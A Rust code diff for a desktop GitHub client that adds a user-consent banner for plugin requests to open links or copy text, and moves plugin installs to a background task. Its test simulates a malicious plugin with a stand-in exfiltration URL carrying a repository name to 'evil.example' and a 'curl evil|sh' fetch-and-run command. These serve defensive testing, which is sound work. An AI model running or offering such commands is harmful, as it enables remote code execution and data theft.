@@ -109,6 +109,10 @@ pub struct App {
     /// Settings → Plugins: the folder or Git address to install from, and what went wrong.
     plugin_src: TextEdit,
     plugin_error: Option<String>,
+    /// A plugin is being installed in the background.
+    plugin_installing: bool,
+    /// What a plugin asks to do outside the app, waiting for the user's answer.
+    plugin_ask: Option<plugins::Request>,
     /// The plugin whose Remove was pressed once (press again to remove it).
     plugin_confirm: Option<String>,
     /// What the plugins' context was last built from (`plugins::context_key`).
@@ -2074,10 +2078,58 @@ impl App {
         self.plugin_tab = Some(p);
     }
 
+    /// A plugin asks to open a link or to copy text. Nothing happens until the user answers;
+    /// while one request waits, others are dropped, so a plugin can't bury it or nag.
+    #[cfg_attr(target_arch = "wasm32", allow(dead_code))]
+    pub(crate) fn plugin_asks(&mut self, request: plugins::Request) {
+        if self.plugin_ask.is_none() {
+            self.plugin_ask = Some(request);
+        }
+    }
+
+    /// The user's answer to [`App::plugin_asks`].
+    fn answer_plugin(&mut self, allow: bool, tx: &mut Tx) {
+        let Some(request) = self.plugin_ask.take() else { return };
+        if !allow {
+            return;
+        }
+        match request.ask {
+            plugins::Ask::Open(url) => {
+                let _ = tx.open_url(&url);
+            }
+            plugins::Ask::Copy(text) => {
+                tx.copy(text);
+                self.notify("Copied");
+            }
+        }
+    }
+
     /// Installs the plugin typed in Settings (a folder or a Git address) and starts it.
     #[cfg(not(target_arch = "wasm32"))]
     fn install_plugin(&mut self, example: bool) {
-        let result = if example { plugins::create_example() } else { plugins::install(&self.plugin_src.text) };
+        if self.plugin_installing {
+            return;
+        }
+        if example {
+            self.plugin_installed(plugins::create_example(), true);
+            return;
+        }
+        // Cloning can take a while, or never answer: not on the UI thread.
+        let source = self.plugin_src.text.clone();
+        match self.handle.clone() {
+            Some(h) => {
+                self.plugin_installing = true;
+                self.plugin_error = None;
+                net::spawn(h, move || async move { plugins::install(&source) }, |s: &mut App, r| s.plugin_installed(r, false));
+            }
+            None => self.plugin_installed(plugins::install(&source), false),
+        }
+    }
+
+    /// An install finished: starts the plugin, or says why it isn't one.
+    #[cfg(not(target_arch = "wasm32"))]
+    fn plugin_installed(&mut self, result: Result<String, String>, example: bool) {
+        self.plugin_installing = false;
         match result {
             Ok(id) => {
                 self.plugin_error = None;
@@ -2282,6 +2334,8 @@ fn init() -> App {
         plugin_tab: None,
         plugin_src: TextEdit::new(""),
         plugin_error: None,
+        plugin_installing: false,
+        plugin_ask: None,
         plugin_confirm: None,
         plugin_ctx_key: 0,
         shown_dark: std::cell::Cell::new(false),
@@ -2628,6 +2682,35 @@ fn title(s: &App) -> String {
 }
 
 /// A banner when a new version is ready, or while it downloads.
+/// A plugin's request to open a link or copy text, with the buttons that answer it.
+fn plugin_ask_banner(s: &App, k: &Kit) -> Option<El> {
+    use rune_kit::{Button, ButtonVariant};
+    let request = s.plugin_ask.as_ref()?;
+    let short = |t: &str, n: usize| if t.chars().count() > n { format!("{}…", t.chars().take(n).collect::<String>()) } else { t.to_owned() };
+    let (title, detail, yes) = match &request.ask {
+        plugins::Ask::Open(url) => (
+            format!("The plugin {} wants to open a page on {}", request.plugin, plugins::host(url).unwrap_or("another site")),
+            format!("{}\nThe address can carry what the plugin can see here (names of your repositories, issues and pull requests).", short(url, 300)),
+            "Open",
+        ),
+        plugins::Ask::Copy(text) => (
+            format!("The plugin {} wants to copy this to the clipboard", request.plugin),
+            short(text, 300),
+            "Copy",
+        ),
+    };
+    let tint = k.c.warning.icon;
+    Some(col().w_full().px(14.0).py(10.0).gap(8.0).radius(k.radius.lg).key("plugin-ask").role("alert")
+        .fill(tint.alpha(0.12)).border(1.0, tint.alpha(0.45))
+        .child(text(title).font(k.ty.small_medium).color(k.c.text_strong).wrap())
+        .child(text(detail).font(k.ty.mono).color(k.c.text_base).wrap())
+        .child(row().gap(8.0)
+            .child(Button::new("Don't").variant(ButtonVariant::Ghost).control_size(ControlSize::Small)
+                .on_press_tx(|s: &mut App, tx| s.answer_plugin(false, tx)).build(k).key("plugin-ask-no"))
+            .child(Button::new(yes).control_size(ControlSize::Small)
+                .on_press_tx(|s: &mut App, tx| s.answer_plugin(true, tx)).build(k).key("plugin-ask-yes"))))
+}
+
 fn update_banner(s: &App, k: &Kit) -> Option<El> {
     use rune_kit::{Button, ButtonVariant};
     let (msg, actions) = match &s.update {
@@ -2724,6 +2807,9 @@ fn view(s: &App, cx: &mut Cx<App>) -> El {
     };
     let mut inner = col().w_full().max_w(1080.0).gap(16.0);
     if let Some(b) = update_banner(s, &k) {
+        inner = inner.child(b);
+    }
+    if let Some(b) = plugin_ask_banner(s, &k) {
         inner = inner.child(b);
     }
     if let Some(b) = banner(s, &k) {
@@ -3402,6 +3488,48 @@ mod load_gen_tests {
 
         assert_eq!(s.cfg.api, "https://api.github.com", "saving account must reset untrusted API host to default or user env even if GITHUB_API_URL was in process env");
         assert_eq!(s.cfg.sources.api, Some(crate::config::Source::Default));
+    }
+}
+
+#[cfg(all(test, not(target_arch = "wasm32")))]
+mod fix52_tests {
+    use crate::plugins::{Ask, Request};
+
+    fn press(rt: &mut rune::Runtime<crate::App>, key: &str) {
+        let (x, y) = rt.find(key).unwrap_or_else(|| panic!("{key} is on screen"));
+        rt.pointer_move(x, y);
+        rt.pointer_down(x, y);
+        rt.pointer_up(x, y);
+        rt.frame(0.1);
+    }
+
+    #[test]
+    fn a_plugins_request_waits_for_the_users_answer() {
+        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let mut s = crate::init();
+        s.data = crate::model::Data::sample();
+        s.pending_place = None;
+        // What a plugin's `changed` handler does as soon as it loads: nothing opens, the
+        // request waits on screen.
+        s.plugin_asks(Request { plugin: "Sneaky".into(), ask: Ask::open("https://evil.example/?d=private-repo").unwrap() });
+        // It can't replace the request on screen with another one, or pile them up.
+        s.plugin_asks(Request { plugin: "Sneaky".into(), ask: Ask::copy("curl evil|sh").unwrap() });
+        assert_eq!(s.plugin_ask.as_ref().map(|r| &r.ask), Some(&Ask::Open("https://evil.example/?d=private-repo".into())));
+
+        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
+        rt.frame(0.0);
+        assert!(rt.find("plugin-ask").is_some(), "the request is shown");
+        press(&mut rt, "plugin-ask-no");
+        assert_eq!(rt.state.plugin_ask, None);
+        assert!(rt.find("plugin-ask").is_none());
+        assert!(rt.state.toast.is_none(), "refusing does nothing else");
+
+        // Allowing a copy copies, once.
+        rt.update(|s, _| s.plugin_asks(Request { plugin: "Checklist".into(), ask: Ask::copy("- [ ] ship it").unwrap() }));
+        rt.frame(0.2);
+        press(&mut rt, "plugin-ask-yes");
+        assert_eq!(rt.state.plugin_ask, None);
+        assert_eq!(rt.state.toast.as_ref().map(|t| t.text.as_str()), Some("Copied"));
     }
 }
 
